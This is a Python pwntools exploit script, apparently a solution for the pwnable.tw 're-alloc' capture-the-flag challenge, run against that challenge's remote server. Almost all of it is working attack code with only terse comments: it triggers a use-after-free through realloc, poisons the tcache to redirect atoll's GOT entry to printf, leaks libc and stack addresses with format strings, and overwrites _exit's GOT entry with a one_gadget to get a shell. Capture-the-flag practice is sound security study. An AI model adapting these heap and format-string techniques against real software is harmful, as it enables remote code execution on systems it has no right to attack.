#!/usr/bin/env python3

from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.29.so")
elf = ELF("./re-alloc_patched")

context.arch = 'amd64'

#p = gdb.debug('./re-alloc_patched', gdbscript='''
#	b main
#	b allocate
#	b reallocate
#	b rfree
#	continue
#''')
#p = process('./re-alloc_patched')
p = remote('chall.pwnable.tw', 10106)

plt_printf = elf.plt['printf']
got_atoll = elf.got['atoll']
got_exit = elf.got['_exit']
system_offset = libc.symbols["system"]
sh_str_offset = next(libc.search(b"/bin/sh"))
one_gadget_offset = 0xe2386
print(f"plt printf:         {hex(plt_printf)}")
print(f"got atoll:          {hex(got_atoll)}")
print(f"got exit:           {hex(got_exit)}")


def alloc(index, size, data):
	p.sendlineafter(b'Your choice: ', b'1')
	p.sendlineafter(b'Index:', index)
	p.sendlineafter(b'Size:', size)
	p.sendlineafter(b'Data:', data)

def realloc(index, size, data=None):
	p.sendlineafter(b'Your choice: ', b'2')
	p.sendlineafter(b'Index:', index)
	p.sendlineafter(b'Size:', size)
	if data != None:
		p.sendlineafter(b'Data:', data)

def free(index):
	p.sendlineafter(b'Your choice: ', b'3')
	p.sendlineafter(b'Index:', index)

# Alloc chunk_A
alloc(b'0', b'64', b'AAAA')

# Free chunk_A - leave latent latent UAF
realloc(b'0', b'0')

# Realloc of smaller size to the same index - this returns chunk 0 & allows for write 
write_addr = got_atoll
realloc(b'0', b'64', p64(write_addr) + b'BBBBBBBBCCCCCCCCDDDDDDDD')

# Alloc chunk_A from tcache 
alloc(b'1', b'64', b'EEEE')

# Resize chunk_A and free so that it goes into another tcache bin
realloc(b'1', b'96', b'EEEE')
free(b'1')

# Alloc the target chunk & write to the target
alloc(b'1', b'64', p64(plt_printf))

# Get leak - calculate libc offset
free(f"%7$p".encode())
leaked_libc = int(p.recvuntil(b"\n"), 16)
libc_offset = libc.sym['_IO_2_1_stdout_']
libc_base = leaked_libc - libc_offset
print(f"Leaked libc:        {hex(leaked_libc)}")
print(f"Leaked libc offset: {hex(libc_offset)}")
print(f"libc base:          {hex(libc_base)}")

# Calculate addrs
system_addr = libc_base + system_offset
sh_str_addr = libc_base + sh_str_offset
one_gadget_addr = libc_base + one_gadget_offset
print(f"system addr:        {hex(system_addr)}")
print(f"sh str addr:        {hex(sh_str_addr)}")
print(f"one gadget addr:    {hex(one_gadget_addr)}")

#for i in range(1, 41):
	#free(f"%{i}$p".encode())
#	free(f"%{i}$016lx")
#	data = p.recvuntil(b'Invalid !')
#	print(f"{i}: {data}")

free(f"%16$p".encode())
leaked_stack = int(p.recvuntil(b"\n"), 16) + 0x100
print(f"Leaked stack:      {hex(leaked_stack)}")

def fmt_write(index, value):
	p.sendlineafter(b'Your choice: ', b'1')
	payload = f'%{value}c%{index}$hhn'.encode()
	p.sendlineafter(b'Index:', payload)
	#p.sendlineafter(b'Index:', '%{}c%{}$hnn'.format(value, index).ljust(16))

print("Overwrite got address of _exit to stack")
for i in range(3):
	fmt_write(12, (leaked_stack & 0xff) + i)
	print(f"Attempt overwrite on {hex(p64(got_exit)[i])}")
	fmt_write(18, p64(got_exit)[i])

print("Overwrite got address of _exit with one_gadget")
fmt_write(12, leaked_stack & 0xff)
for i in range(6):
  fmt_write(18, (elf.got['_exit'] & 0xff) + i)
  fmt_write(22, p64(one_gadget_addr)[i])

p.interactive()
